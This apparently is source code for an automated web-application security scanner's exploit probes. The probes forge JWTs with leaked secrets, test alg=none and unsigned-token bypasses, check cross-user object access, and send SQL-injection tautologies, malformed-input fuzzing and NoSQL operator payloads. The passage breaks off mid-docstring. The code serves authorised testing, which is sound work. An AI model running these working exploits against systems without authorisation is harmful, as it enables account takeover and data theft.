"""
execution/probes.py — Active exploit probes
============================================
QAX's runner could only send HTTP requests and click UI. Some bugs need MORE than
that to prove — forging a token with a leaked secret, or crashing an endpoint with
oversized input. Probes are that broader execution vocabulary: each actively tries
an exploit and returns hard evidence when it works.

The crown jewel is forge_jwt: it signs a JWT with the secret the AppModel found
hardcoded in config and uses it to impersonate a freshly-registered victim — the
critical bug QAX was structurally unable to reach. Signing is pure stdlib HMAC (no
new dependency), covering the symmetric HS256/384/512 algorithms a hardcoded secret
implies.

All probes are best-effort and never raise to the caller.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import re
import time
import uuid

import requests

from services.results import ProbeFinding

logger = logging.getLogger(__name__)

_HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def _b64(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def sign_jwt_hs(secret: str, algorithm: str, claims: dict) -> str | None:
    """Sign a JWT with an HMAC (symmetric) algorithm using only the stdlib."""
    hasher = _HASHES.get((algorithm or "HS256").upper())
    if hasher is None:
        return None
    header = _b64(json.dumps({"alg": algorithm.upper(), "typ": "JWT"},
                             separators=(",", ":")).encode())
    payload = _b64(json.dumps(claims, separators=(",", ":")).encode())
    signing_input = header + b"." + payload
    sig = _b64(hmac.new(secret.encode(), signing_input, hasher).digest())
    return (signing_input + b"." + sig).decode()


def _b64url_decode(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def _jwt_payload_segment(token: str):
    """(parts, payload_dict) for a well-formed JWT, else None."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        return parts, json.loads(_b64url_decode(parts[1]))
    except Exception:
        return None


def jwt_flaws_probe(model, base_url: str, *, session: requests.Session | None = None,
                    auth: dict | None = None) -> list[ProbeFinding]:
    """
    Deep JWT-validation flaws, proven with a CONTROL. Needs a VALID token (supplied
    or self-registered) and a protected endpoint where valid→2xx and no-token→401.
    Then it tampers the valid token and checks the endpoint still accepts it:
      • header alg=none + empty signature accepted → the algorithm isn't enforced (P1).
      • a garbage signature accepted → the signature isn't verified at all (P1).
    A correct server (algorithms=[HS256], signature+exp checked) rejects both → quiet.
    No secret needed — this catches bugs forge-jwt (which needs a leaked secret) can't.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    target = next((str(e.get("path")) for e in getattr(model, "endpoints", [])
                   if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
                   and e.get("auth_required") and "{" not in str(e.get("path", ""))), None)
    target = target or recipe.get("identity_path")
    if not target:
        return out
    token = _resolve_token(sess, base, recipe, model, f"jwtf_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
    if not token:
        return out
    url = f"{base}{target}"

    def code_with(tok):
        try:
            return sess.get(url, headers=_auth_headers(tok, auth), timeout=15).status_code
        except Exception:
            return None

    try:
        s_notoken = sess.get(url, timeout=15).status_code
    except Exception:
        return out
    s_valid = code_with(token)
    # Controls: the valid token must work AND the endpoint must reject no token.
    if not (isinstance(s_valid, int) and 200 <= s_valid < 300):
        return out
    if s_notoken not in (401, 403):
        return out

    parsed = _jwt_payload_segment(token)
    if not parsed:
        return out
    parts = parsed[0]

    none_header = _b64(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode()).decode()
    alg_none = f"{none_header}.{parts[1]}."
    c = code_with(alg_none)
    if isinstance(c, int) and 200 <= c < 300:
        out.append(ProbeFinding(
            probe="jwt-flaws", title=f"JWT alg=none accepted — authentication bypass on GET {target}",
            exploited=True, severity="P1",
            evidence=(f"A token with header alg=none and NO signature was accepted (HTTP {c}, same as a "
                      f"valid token; no token → {s_notoken}). The server does not enforce the signing "
                      f"algorithm — anyone can forge a valid session."),
            target=target))

    tampered = f"{parts[0]}.{parts[1]}.{'A' * max(10, len(parts[2]))}"
    c = code_with(tampered)
    if isinstance(c, int) and 200 <= c < 300:
        out.append(ProbeFinding(
            probe="jwt-flaws", title=f"JWT signature not verified — any token forgeable on GET {target}",
            exploited=True, severity="P1",
            evidence=(f"A token with a garbage signature was accepted (HTTP {c}; no token → {s_notoken}). "
                      f"The server does not verify the signature — tokens can be forged at will."),
            target=target))
    return out


def _jwt_algorithm(model) -> str:
    """Read the JWT algorithm from the model's config, defaulting to HS256."""
    for c in getattr(model, "config", []):
        if isinstance(c, dict) and "algorithm" in str(c.get("key", "")).lower():
            return str(c.get("default") or "HS256")
    return "HS256"


def forge_jwt_probe(model, base_url: str, *, session: requests.Session | None = None) -> ProbeFinding | None:
    """
    Try to forge a JWT with the hardcoded secret and impersonate a victim.

    Returns a ProbeFinding (exploited=True on success), or None when there is no
    hardcoded secret to forge with.
    """
    sess = session or requests.Session()

    secret = None
    for s in getattr(model, "exposed_secrets", []):
        if any(k in str(s.get("key", "")).lower() for k in ("jwt", "secret", "sign", "token", "key")):
            secret = s.get("default")
            break
    if not secret:
        return None

    algorithm = _jwt_algorithm(model)
    if not algorithm.upper().startswith("HS"):
        return ProbeFinding(probe="forge-jwt", title="JWT uses an asymmetric algorithm",
                            exploited=False, severity="P1",
                            evidence=f"algorithm {algorithm} — a config secret is not the signing key",
                            target="auth")

    from core.auth_recipe import derive_auth_recipe, register_body, subject_candidates
    recipe = derive_auth_recipe(model)
    register = recipe["register_path"]
    identity = recipe["identity_path"]
    base = base_url.rstrip("/")
    victim = f"victim_{uuid.uuid4().hex[:8]}@example.com"

    reg_response = None
    try:
        rr = sess.post(f"{base}{register}",
                       json=register_body(recipe, model, victim, password="Str0ngPass!23"),
                       timeout=15)
        try:
            reg_response = rr.json()
        except Exception:
            reg_response = None
    except Exception as exc:  # pragma: no cover - network
        logger.warning("forge_jwt: victim register failed: %s", exc)

    exp = int(time.time()) + 3600
    for sub in subject_candidates(victim, reg_response):
        token = sign_jwt_hs(secret, algorithm, {"sub": sub, "exp": exp})
        if not token:
            continue
        try:
            r = sess.get(f"{base}{identity}", headers={"Authorization": f"Bearer {token}"}, timeout=15)
        except Exception as exc:  # pragma: no cover - network
            logger.warning("forge_jwt: identity call failed: %s", exc)
            continue
        if r.status_code == 200 and victim in r.text:
            return ProbeFinding(
                probe="forge-jwt",
                title="JWT forgery → full account takeover",
                exploited=True, severity="P1",
                evidence=(f"Forged a token for {victim} with the hardcoded secret "
                          f"{str(secret)[:24]!r} (alg {algorithm}); GET {identity} returned 200 with "
                          f"the victim's data — no password needed."),
                target=identity)

    return ProbeFinding(probe="forge-jwt", title="JWT forgery attempt did not succeed",
                        exploited=False, severity="P1",
                        evidence="forged token was rejected (secret/subject/alg did not match)",
                        target=identity)


_SQL_ERRORS = ("sql syntax", "sqlite3", "operationalerror", "sqlalchemy",
               "unrecognized token", "syntax error", "psycopg2", "you have an error in your sql",
               "unterminated", "near \"", "programmingerror")


_ID_KW = ("email", "username", "login", "phone", "mobile", "msisdn", "user")
_SECRET_KW = ("password", "passwd", "pwd", "secret", "pin", "pass")


_RES_SKIP_SEGS = {"api", "rest", "register", "signup", "sign-up", "sign_up", "login",
                  "signin", "sign-in", "session", "sessions", "token", "auth", "authenticate"}


def _resource_key(path: str) -> str | None:
    """
    The singular resource name an API likely wraps a body under, from the endpoint
    path: /api/users -> "user", /users/v1/register -> "user". Skips version/action
    segments. Used to recover from a model that missed a wrapper like {"user":{...}}.
    """
    for seg in reversed([p for p in str(path).strip("/").split("/") if p]):
        s = seg.lower()
        if "{" in seg or ":" in seg or s in _RES_SKIP_SEGS or re.fullmatch(r"v\d+", s):
            continue
        return s[:-1] if s.endswith("s") and len(s) > 1 else s
    return None


def _auth_token(sess, base, recipe, model, identity, password="Secret123!"):
    """
    Register `identity` then log in and return a bearer token (or None).

    The login body is built from the LOGIN endpoint's OWN request fields — not the
    register id field — because an app can register with one identifier (email) and
    log in with another (username). The value reused is whatever the register body
    put in that same field, so the two always match.

    If the modelled register body is rejected (4xx), we retry once with it WRAPPED
    under the resource name (e.g. {"user": {...}}) — recovering on APIs whose wrapper
    the source model didn't capture — and apply the same wrapper to the login body.
    """
    from core.auth_recipe import field_names, nest_body, register_body
    reg_body = register_body(recipe, model, identity, password=password)
    reg_url = f"{base}{recipe['register_path']}"
    wrapper = None
    try:
        rr = sess.post(reg_url, json=reg_body, timeout=15)
    except Exception:
        return None
    if getattr(rr, "status_code", 500) >= 400:
        w = _resource_key(recipe["register_path"])
        if w and not (isinstance(reg_body, dict) and w in reg_body):
            try:
                rr2 = sess.post(reg_url, json={w: reg_body}, timeout=15)
                if getattr(rr2, "status_code", 500) < 400:
                    wrapper = w
            except Exception:
                pass

    login_fields: list[str] = []
    for e in getattr(model, "endpoints", []):
        if (isinstance(e, dict) and str(e.get("path", "")) == recipe["login_path"]
                and str(e.get("method", "")).upper() == "POST"):
            login_fields = field_names(e.get("request_fields"))
            break
    id_field = next((f for f in login_fields if any(k in f.lower() for k in _ID_KW)), recipe["id_field"])
    sec_field = next((f for f in login_fields if any(k in f.lower() for k in _SECRET_KW)), recipe["secret_field"])
    id_value = reg_body.get(id_field, identity)
    login_url = f"{base}{recipe['login_path']}"

    def _wrap(bdy):
        return {wrapper: bdy} if (wrapper and not (isinstance(bdy, dict) and wrapper in bdy)) else bdy

    tok = None
    # 1) JSON login (FastAPI/Flask-RESTX/connexion style). nest_body wraps dotted
    #    fields, and _wrap applies the resource wrapper recovered at registration,
    #    so this works on APIs that wrap the body (e.g. {"user":{...}}).
    try:
        lr = sess.post(login_url, json=_wrap(nest_body({id_field: id_value, sec_field: password})), timeout=15)
        tok = _extract_token(lr, recipe)
    except Exception:
        tok = None
    # 2) OAuth2 form login (OAuth2PasswordRequestForm): x-www-form-urlencoded with the
    #    literal fields `username`/`password`. Common on FastAPI apps — without this
    #    QAX can't get a token there and every auth'd probe silently skips.
    if not tok:
        try:
            lr = sess.post(login_url, data={"username": id_value, "password": password}, timeout=15)
            tok = _extract_token(lr, recipe)
        except Exception:
            tok = None
    # Record the user we just created (with its own token) so the scan can delete it.
    if tok:
        _record_created(sess, _collection_of(recipe["register_path"]), reg_body,
                        {"Authorization": f"Bearer {tok}"})
    return tok


def _extract_token(response, recipe):
    """Pull a bearer token out of a login response (recipe field, then any token-ish
    key), searching nested objects too so wrapped responses like {"user":{"token"}} work."""
    try:
        if response.status_code >= 400:
            return None
        data = response.json()
    except Exception:
        return None
    return _search_token(data, recipe.get("token_field", "access_token"))


def _search_token(data, token_field, _depth: int = 0):
    """Recursively find a bearer token: the exact field first, then any token-ish key."""
    if _depth > 4 or not isinstance(data, dict):
        return None
    v = data.get(token_field)
    if isinstance(v, str) and v:
        return v
    for k, val in data.items():
        if isinstance(val, str) and val and any(t in k.lower() for t in ("token", "jwt", "access", "auth")):
            return val
    for val in data.values():
        if isinstance(val, dict):
            r = _search_token(val, token_field, _depth + 1)
            if r:
                return r
    return None


def _auth_headers(token, auth: dict | None = None) -> dict:
    """Build the auth header for a token, honouring a supplied header name/scheme."""
    if not token:
        return {}
    auth = auth or {}
    header = auth.get("header") or "Authorization"
    scheme = auth.get("scheme", "Bearer") if "scheme" in auth else "Bearer"
    value = f"{scheme} {token}".strip() if scheme else str(token)
    return {header: value}


# Trailing path segments that denote an action, not the resource collection.
_ACTION_SEGS = ("register", "signup", "sign-up", "sign_up", "create", "new", "add")


def _collection_of(path: str) -> str:
    """The resource collection a create endpoint writes into (strip a trailing action)."""
    segs = str(path).rstrip("/").split("/")
    if segs and segs[-1].lower() in _ACTION_SEGS:
        return "/".join(segs[:-1]) or "/"
    return str(path).rstrip("/")


def _record_created(sess, collection: str, body: dict, headers: dict) -> None:
    """
    Note a disposable record QAX just created, so the scan can clean it up afterwards.
    No-op unless the caller (ProbeService) opened a registry on the session, so probes
    run in isolation (and tests) write nothing extra. Never raises.
    """
    try:
        reg = getattr(sess, "_qax_created", None)
        if reg is None:
            return
        reg.append({"collection": collection, "body": dict(body or {}), "headers": dict(headers or {})})
    except Exception:
        pass


def cleanup_artifacts(model, base_url: str, session) -> int:
    """
    Best-effort DELETE of the disposable records QAX created this scan. Deletes ONLY
    keys QAX itself recorded, matched to a DELETE endpoint on the same collection and
    authorized with the creator's own token. Never deletes anything it did not create,
    and never raises. Returns the count actually removed.
    """
    reg = getattr(session, "_qax_created", None)
    if not reg:
        return 0
    base = base_url.rstrip("/")
    dels = []
    for e in getattr(model, "endpoints", []):
        if isinstance(e, dict) and str(e.get("method", "")).upper() == "DELETE":
            p = str(e.get("path", ""))
            m = re.search(r"\{([^}]+)\}", p)
            if m:
                dels.append((p, m.group(1), p[:m.start()].rstrip("/")))
    if not dels:
        return 0
    cleaned = 0
    for art in reg:
        match = next((d for d in dels if d[2] == art.get("collection", "")), None)
        if not match:
            continue
        path, param, _ = match
        body = art.get("body", {})
        key = body.get(param)
        if key is None:
            key = next((v for k, v in body.items() if k.lower() == param.lower()), None)
        if key is None:
            key = next((body[f] for f in body if any(k in f.lower()
                        for k in ("username", "email", "title", "name", "id", "key", "slug"))), None)
        if key is None:
            continue
        url = f"{base}{path.replace('{' + param + '}', str(key))}"
        try:
            r = session.delete(url, headers=art.get("headers", {}), timeout=15)
            if getattr(r, "status_code", 500) < 300:
                cleaned += 1
        except Exception:
            continue
    return cleaned


def _resolve_token(sess, base, recipe, model, identity, *, auth: dict | None = None, slot: str = "primary"):
    """
    Get a bearer token for a probe. Prefer a token SUPPLIED by the caller (so apps
    that issue tokens outside a register/login flow — external IdP, offline-signed
    JWT, API key — can still be exercised); otherwise self-register + login.
    `slot` picks which supplied token: 'primary' (user A) or 'secondary' (user B).
    """
    auth = auth or {}
    if slot == "secondary" and auth.get("token_b"):
        return auth["token_b"]
    if slot == "primary" and auth.get("token"):
        return auth["token"]
    # NB: each call self-registers a FRESH user on purpose — do not cache/share the
    # token across probes. BOLA's two-user control needs genuinely distinct users, and
    # sharing one "primary" user across probes defeats it (B would read its own object).
    return _auth_token(sess, base, recipe, model, identity)


def bola_probe(model, base_url: str, *, session: requests.Session | None = None,
               auth: dict | None = None) -> list[ProbeFinding]:
    """
    Broken Object-Level Authorization via a TWO-USER control experiment.

    User A creates an object carrying a unique secret marker; user B then reads it
    by its key. If B's read returns 2xx WITH A's marker, there is no ownership check
    — B read A's private object. A reading its own object first is the control that
    proves the object and endpoint are valid (so a failure to create isn't misread).
    When the app is safe, B gets a 404 and nothing is flagged.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, field_names, nest_body
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]

    # Pair each auth-required "read by key" GET with the POST that creates into the
    # same collection, and find which body field is the object's key.
    pairs = []
    for ge in eps:
        if str(ge.get("method", "")).upper() != "GET" or not ge.get("auth_required"):
            continue
        gp = str(ge.get("path", ""))
        m = re.search(r"\{([^}]+)\}", gp)
        if not m:
            continue
        param = m.group(1)
        prefix = gp[:m.start()].rstrip("/")
        post = next((e for e in eps if str(e.get("method", "")).upper() == "POST"
                     and str(e.get("path", "")).rstrip("/") == prefix
                     and field_names(e.get("request_fields"))), None)
        if not post:
            continue
        pf = field_names(post.get("request_fields"))
        key_field = next((f for f in pf if f.lower() == param.lower()), None) \
            or next((f for f in pf if any(k in f.lower() for k in ("title", "name", "id", "slug", "key"))), None)
        if key_field:
            pairs.append((post, ge, prefix, param, key_field, pf))
    if not pairs:
        return out

    ta = _resolve_token(sess, base, recipe, model, f"bola_a_{uuid.uuid4().hex[:8]}@example.com",
                        auth=auth, slot="primary")
    tb = _resolve_token(sess, base, recipe, model, f"bola_b_{uuid.uuid4().hex[:8]}@example.com",
                        auth=auth, slot="secondary")
    if not ta or not tb:
        return out

    _CONTENT_KW = ("secret", "content", "body", "data", "value", "text", "note", "description", "payload")
    for post, ge, prefix, param, key_field, pf in pairs[:4]:
        key = f"qaxbola{uuid.uuid4().hex[:10]}"
        marker = f"qaxmarker{uuid.uuid4().hex[:12]}"
        body: dict = {}
        for f in pf:
            lf = f.lower()
            if f == key_field:
                body[f] = key
            elif any(k in lf for k in _CONTENT_KW):
                body[f] = marker
            elif any(k in lf for k in _SECRET_KW):
                body[f] = "Secret123!"
            elif any(k in lf for k in ("age", "count", "number", "qty")):
                body[f] = 1
            else:
                body[f] = "test"
        if marker not in str(body):  # make sure a detectable secret is present
            placed = next((f for f in pf if f != key_field), None)
            if not placed:
                continue  # key-only resource: nothing private to leak, can't prove
            body[placed] = marker

        auth_a = _auth_headers(ta, auth)
        auth_b = _auth_headers(tb, auth)
        try:
            cr = sess.post(f"{base}{prefix}", json=nest_body(body), headers=auth_a, timeout=15)
            if cr.status_code >= 400:
                continue
            _record_created(sess, prefix, body, auth_a)
            read_path = f"{base}{str(ge['path']).replace('{' + param + '}', key)}"
            ar = sess.get(read_path, headers=auth_a, timeout=15)
            if ar.status_code >= 400:  # control: A must be able to read its own object
                continue
            br = sess.get(read_path, headers=auth_b, timeout=15)
        except Exception:
            continue
        if br.status_code < 300 and marker in (br.text or ""):
            out.append(ProbeFinding(
                probe="bola", title=f"Broken object-level authorization in GET {ge['path']}",
                exploited=True, severity="P1",
                evidence=(f"User B read user A's object (key '{key}') via {ge['path']}: B's request "
                          f"returned {br.status_code} containing A's private content. The endpoint "
                          f"has no ownership check — any authenticated user can read any object."),
                target=str(ge["path"])))
    return out


def sqli_probe(model, base_url: str, *, session: requests.Session | None = None,
               auth: dict | None = None) -> list[ProbeFinding]:
    """
    Error-based SQL injection with a CONTROL: a benign value vs the same value with
    a single quote. If the quote breaks the query (5xx or a SQL error in the body)
    while the benign value is fine, the input reaches a raw query — injection.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    cands = [e for e in getattr(model, "endpoints", [])
             if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
             and "{" in str(e.get("path", ""))]
    token = None
    if any(e.get("auth_required") for e in cands):
        token = _resolve_token(sess, base, recipe, model, f"sqli_{uuid.uuid4().hex[:8]}@example.com", auth=auth)

    for e in cands[:5]:
        path = str(e.get("path", ""))
        m = re.search(r"\{([^}]+)\}", path)
        if not m:
            continue
        param = m.group(1)
        headers = _auth_headers(token, auth) if e.get("auth_required") else {}

        def send(value, _p=path, _pr=param, _h=headers):
            try:
                r = sess.get(f"{base}{_p.replace('{' + _pr + '}', str(value))}", headers=_h, timeout=15)
                return r.status_code, r.text
            except Exception:
                return None, ""

        f = _detect_injection(send, method=str(e.get("method", "GET")), path=path,
                              where=f"path param '{param}'")
        if f:
            out.append(f)
    return out


# Payloads that break out of a string literal in either quote style, and boolean
# tautologies for a differential (row-count) proof (QA knowledge base sec 1.6).
_QUOTES = ('"', "'")


def _detect_injection(send, *, method: str, path: str, where: str) -> ProbeFinding | None:
    """
    Confirm SQL injection from a `send(value) -> (status, body)` closure, with a
    control. Two independent proofs, either is enough:
      • error-based: a quote (either style) yields a SQL error in the body → P1.
      • boolean-based: a TRUE tautology returns far more data than both the benign
        value and a matched FALSE tautology → the WHERE clause was bypassed → P1.
    A 5xx with no SQL error text is reported as P3 robustness only (not proof —
    don't cry wolf). Benign already 5xx = no clean signal.
    """
    def ask(value):
        # A 5xx can reset a keep-alive connection, so the FOLLOWING request on a
        # shared session errors (status None). Retry once to re-establish it.
        s, b = send(value)
        if s is None:
            s, b = send(value)
        return s, b

    sb, bb = ask("qaxprobe1")
    if sb is None or sb >= 500:
        return None
    nben = len(bb or "")
    p3: ProbeFinding | None = None
    for q in _QUOTES:
        # Boolean-differential FIRST (both payloads are valid SQL → 200, no 5xx to
        # reset the connection): a TRUE tautology returning far more data than a
        # matched FALSE one and the benign value = the WHERE clause was bypassed.
        st_t, bt_t = ask(f"qaxprobe1{q} OR {q}1{q}={q}1")
        st_f, bt_f = ask(f"qaxprobe1{q} OR {q}1{q}={q}2")
        if (st_t == 200 and st_f == 200 and bt_t is not None and bt_f is not None
                and len(bt_t) > max(len(bt_f), nben) * 2 + 20):
            return ProbeFinding(
                probe="sqli", title=f"SQL injection in {method} {path} ({where})",
                exploited=True, severity="P1",
                evidence=(f"Boolean injection in {where}: a TRUE tautology returned far more data "
                          f"({len(bt_t)}B) than a matched FALSE one ({len(bt_f)}B) or the benign value "
                          f"({nben}B) — the WHERE clause was bypassed."),
                target=path)
        # Then error-based: a quote that yields a SQL error = confirmed (P1); a bare
        # 5xx = robustness lead only (P3 — not proof, don't cry wolf).
        st, bt = ask("qaxprobe1" + q)
        if st is not None and st >= 500:
            if any(s in (bt or "").lower() for s in _SQL_ERRORS):
                return ProbeFinding(
                    probe="sqli", title=f"SQL injection in {method} {path} ({where})",
                    exploited=True, severity="P1",
                    evidence=(f"A {q} in {where} produced a SQL error (benign → {sb}, payload → {st}). "
                              f"The input reaches a raw, unparameterized query."),
                    target=path)
            p3 = p3 or ProbeFinding(
                probe="input-robustness",
                title=f"Unhandled 500 on injection-style input in {method} {path} ({where})",
                exploited=True, severity="P3",
                evidence=(f"A {q} in {where} caused HTTP {st} (benign → {sb}) with NO SQL error text. "
                          f"Likely injection or input-handling; NOT confirmed — reported low and separately."),
                target=path)
    return p3


_DATE_KW = ("time", "date", "_at", "timestamp", "expir", "start", "end", "dob",
            "created", "updated", "scheduled", "deadline", "dateofbirth")


def _benign_body(fields: list[str]) -> dict:
    """A type-plausible benign body (by field-name heuristic) that should pass validation."""
    body: dict = {}
    for f in fields:
        lf = f.lower()
        if "email" in lf:
            body[f] = "qaxprobe1@example.com"
        elif any(k in lf for k in _DATE_KW):
            body[f] = "2020-01-01T00:00:00"          # a valid ISO datetime baseline
        elif any(k in lf for k in ("age", "count", "number", "qty", "amount", "price", "id")):
            body[f] = 1
        elif any(k in lf for k in ("is_", "enabled", "active", "admin", "approved")):
            body[f] = False
        else:
            body[f] = "qaxprobe1"
    return body


def _stringy(field: str, value) -> bool:
    """A field worth quote-fuzzing for SQLi: a plain text string (not email/date)."""
    if not isinstance(value, str):
        return False
    lf = field.lower()
    return "email" not in lf and not any(k in lf for k in _DATE_KW)


# Query params that servers commonly parse as ints without a guard (int(request.args...)).
_COMMON_NUMERIC_PARAMS = ("page", "per_page", "page_size", "limit", "offset", "skip", "size")


def _numeric_param(name: str) -> bool:
    n = name.lower()
    return any(k in n for k in ("page", "limit", "offset", "count", "qty", "amount",
                                "num", "size", "skip", "top"))


def malformed_input_probe(model, base_url: str, *, session: requests.Session | None = None,
                          auth: dict | None = None) -> list[ProbeFinding]:
    """
    Unhandled-500 / debug disclosure from MALFORMED (type-violating) input — the bug
    class a messy app ships: a value the server parses without a try/except
    (datetime.fromisoformat, int(), json.loads, UUID…). Posts a VALID baseline body,
    then sets one field at a time to garbage and watches for a 5xx:
      • a 5xx whose body shows an interactive debugger → P1 (debug mode on / RCE risk).
      • a 5xx whose body shows a stack trace → P2 (source/stack disclosure).
      • a plain 5xx → P2 (input not validated — unhandled server error).
    Control: the baseline must be < 500. POST/PUT/PATCH only (never DELETE).
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, field_names
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]
    _tok = {"v": None}

    def headers_for(e):
        if not e.get("auth_required"):
            return {}
        if _tok["v"] is None:
            _tok["v"] = _resolve_token(sess, base, recipe, model,
                                       f"mal_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        return _auth_headers(_tok["v"], auth)

    for e in [x for x in eps if str(x.get("method", "")).upper() in ("POST", "PUT", "PATCH")
              and field_names(x.get("request_fields"))][:6]:
        method = str(e.get("method", "POST")).upper()
        path = re.sub(r"\{[^}]+\}", "1", str(e.get("path", "")))
        headers = headers_for(e)
        fields = field_names(e.get("request_fields"))
        benign = _benign_body(fields)
        try:
            rb = sess.request(method, f"{base}{path}", json=benign, headers=headers, timeout=15)
        except Exception:
            continue
        if rb.status_code >= 500 or rb.status_code >= 400:
            continue  # baseline must be accepted, else we can't attribute a later 5xx
        for fld in fields[:6]:
            bad = dict(benign, **{fld: "qax-not-a-valid-value-!@#"})
            try:
                r = sess.request(method, f"{base}{path}", json=bad, headers=headers, timeout=15)
            except Exception:
                continue
            if r.status_code < 500:
                continue
            body = (r.text or "").lower()
            if any(s in body for s in _DEBUG_INTERACTIVE):
                sev, kind = "P1", "Debug mode / interactive debugger exposed"
            elif any(s in body for s in _DEBUG_TRACE):
                sev, kind = "P2", "Stack trace disclosed"
            else:
                sev, kind = "P2", "Unhandled server error (input not validated)"
            out.append(ProbeFinding(
                probe="malformed-input",
                title=f"{kind} on {method} {e.get('path')} (field '{fld}')",
                exploited=True, severity=sev,
                evidence=(f"A valid body returned {rb.status_code}, but setting '{fld}' to a "
                          f"type-violating value returned HTTP {r.status_code}"
                          + (" exposing an interactive debugger" if sev == "P1" else
                             " with a stack trace/internals" if kind.startswith("Stack") else
                             " — the value is parsed without validation")
                          + ". Malformed input must be rejected with a 4xx."),
                target=str(e.get("path", ""))))
            break  # one finding per endpoint is enough

    # Query-param pass: a type-violating value on a GET param the server parses
    # unguarded (int(request.args.get('page'))...). Tries grounded query params plus
    # common numeric ones, so it works even when no spec lists them.
    for e in [x for x in eps if str(x.get("method", "")).upper() == "GET"][:8]:
        path = re.sub(r"\{[^}]+\}", "1", str(e.get("path", "")))
        headers = headers_for(e)
        qps = list(e.get("query_params") or [])
        cands = qps + [p for p in _COMMON_NUMERIC_PARAMS if p not in qps]
        base_params = {p: ("1" if _numeric_param(p) else "qaxprobe1") for p in cands}
        try:
            rb = sess.get(f"{base}{path}", params=base_params, headers=headers, timeout=15)
        except Exception:
            continue
        if rb.status_code >= 500:
            continue
        for p in cands[:7]:
            try:
                r = sess.get(f"{base}{path}", params=dict(base_params, **{p: "qax-not-a-number-!@#"}),
                             headers=headers, timeout=15)
            except Exception:
                continue
            if r.status_code < 500:
                continue
            body = (r.text or "").lower()
            if any(s in body for s in _DEBUG_INTERACTIVE):
                sev, kind = "P1", "Debug mode / interactive debugger exposed"
            elif any(s in body for s in _DEBUG_TRACE):
                sev, kind = "P2", "Stack trace disclosed"
            else:
                sev, kind = "P2", "Unhandled server error (input not validated)"
            out.append(ProbeFinding(
                probe="malformed-input",
                title=f"{kind} on GET {e.get('path')} (query param '{p}')",
                exploited=True, severity=sev,
                evidence=(f"A valid request returned {rb.status_code}, but '{p}' set to a "
                          f"type-violating value returned HTTP {r.status_code}"
                          + (" exposing an interactive debugger" if sev == "P1" else
                             " with a stack trace/internals" if kind.startswith("Stack") else
                             " — the value is parsed without validation")
                          + ". Malformed query input must be rejected with a 4xx."),
                target=str(e.get("path", ""))))
            break
    return out


def injection_probe(model, base_url: str, *, session: requests.Session | None = None,
                    auth: dict | None = None) -> list[ProbeFinding]:
    """
    SQL injection via QUERY parameters and request-BODY fields (the path-param case
    is sqli_probe). Uses the same error-based + boolean-differential control. Query
    fuzzing is GET-only (idempotent); body fuzzing is POST/PUT/PATCH only (never
    DELETE — a body on DELETE could destroy data). Deterministic, no model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, field_names
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]
    _tok = {"v": None}

    def token_for(e):
        if not e.get("auth_required"):
            return {}
        if _tok["v"] is None:
            _tok["v"] = _resolve_token(sess, base, recipe, model,
                                       f"inj_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        return _auth_headers(_tok["v"], auth)

    # Query-param injection — GET only (safe to repeat).
    for e in [x for x in eps if str(x.get("method", "")).upper() == "GET" and x.get("query_params")][:6]:
        path = re.sub(r"\{[^}]+\}", "qaxprobe1", str(e.get("path", "")))
        headers = token_for(e)
        qps = list(e.get("query_params") or [])
        for qp in qps[:3]:
            def send(value, _qp=qp, _h=headers, _p=path):
                params = {p: "qaxprobe1" for p in qps}
                params[_qp] = value
                try:
                    r = sess.get(f"{base}{_p}", params=params, headers=_h, timeout=15)
                    return r.status_code, r.text
                except Exception:
                    return None, ""

            f = _detect_injection(send, method="GET", path=str(e.get("path", "")),
                                  where=f"query param '{qp}'")
            if f:
                out.append(f)

    # Body-field injection — POST/PUT/PATCH only (never DELETE).
    for e in [x for x in eps if str(x.get("method", "")).upper() in ("POST", "PUT", "PATCH")
              and field_names(x.get("request_fields"))][:6]:
        method = str(e.get("method", "POST")).upper()
        path = re.sub(r"\{[^}]+\}", "qaxprobe1", str(e.get("path", "")))
        headers = token_for(e)
        fields = field_names(e.get("request_fields"))
        benign = _benign_body(fields)
        for fld in [f for f in fields if _stringy(f, benign.get(f))][:3]:
            def send(value, _fld=fld, _h=headers, _p=path, _m=method):
                body = dict(benign, **{_fld: value})
                try:
                    r = sess.request(_m, f"{base}{_p}", json=body, headers=_h, timeout=15)
                    return r.status_code, r.text
                except Exception:
                    return None, ""

            f = _detect_injection(send, method=method, path=str(e.get("path", "")),
                                  where=f"body field '{fld}'")
            if f:
                out.append(f)
    return out


_NOSQL_ERRORS = ("pymongo", "montydb", "bson", "mongoerror", "mongoclient",
                 "unknown operator", "invaliddocument", "cannot encode", "$where")


def nosql_probe(model, base_url: str, *, session: requests.Session | None = None,
                auth: dict | None = None) -> list[ProbeFinding]:
    """
    NoSQL (operator) injection on write endpoints whose body feeds a document query.
    Control: a plain string value vs a Mongo OPERATOR OBJECT in the same field.
      • confirmed (P1): a TRUE operator ({"$ne": <nomatch>}) returns 200 with far
